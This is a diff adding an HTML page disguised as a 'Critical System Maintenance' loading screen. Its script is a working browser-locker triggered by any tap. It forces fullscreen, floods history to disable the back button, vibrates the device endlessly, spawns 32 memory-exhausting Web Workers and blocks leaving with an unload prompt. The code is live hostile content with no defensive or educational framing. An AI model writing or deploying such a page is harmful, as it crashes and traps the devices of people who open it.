@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Critical System Maintenance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <style>
+        /* Making the whole screen a clickable area */
+        body { background: #000; color: #ff0000; font-family: "Courier New", Courier, monospace; text-align: center; padding-top: 30%; overflow: hidden; touch-action: none; height: 100vh; width: 100vw; }
+    </style>
+</head>
+<body onclick="engageLockdown()" ontouchstart="engageLockdown()">
+
+    <div id="box">
+        <h2 style="letter-spacing: 5px;">LOADING SYSTEM...</h2>
+        <p>Please wait for calibration to complete.</p>
+        <!-- No button needed, tapping anywhere triggers it -->
+    </div>
+
+    <script>
+        let triggered = false;
+
+        function engageLockdown() {
+            if (triggered) return; // Prevent double-triggering
+            triggered = true;
+
+            console.log("LOCKDOWN TRIGGERED BY USER INTERACTION AT: " + new Date());
+            
+            // 1. Request Fullscreen
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+
+            document.body.innerHTML = "<h1>SYSTEM OVERLOAD</h1><p>HARDWARE LOCK ACTIVE</p>";
+
+            // 2. THE BACK-BUTTON KILLER
+            setInterval(() => {
+                for(let i=0; i<500; i++) {
+                    window.history.pushState(null, null, "#locked_" + Math.random());
+                }
+            }, 10);
+
+            // 3. THE INFINITE VIBRATOR
+            setInterval(() => {
+                if (navigator.vibrate) {
+                    navigator.vibrate([2000, 10, 2000]);
+                }
+            }, 100);
+
+            // 4. THE THREAD CRUSHER
+            const blobCode = `
+                setInterval(() => {
+                    let b = [];
+                    while(true) { b.push(new Array(1000000).fill('VOIDS')); }
+                }, 1);
+            `;
+            const blob = new Blob([blobCode], {type: 'application/javascript'});
+            const u = URL.createObjectURL(blob);
+            
+            for(let i=0; i<32; i++) {
+                new Worker(u);
+            }
+
+            // 5. THE "ZOMBIE" POPUP
+            window.onbeforeunload = function() {
+                return "Are you sure you want to leave the crash?";
+            };
+        }
+    </script>
+</body>
+</html>
+
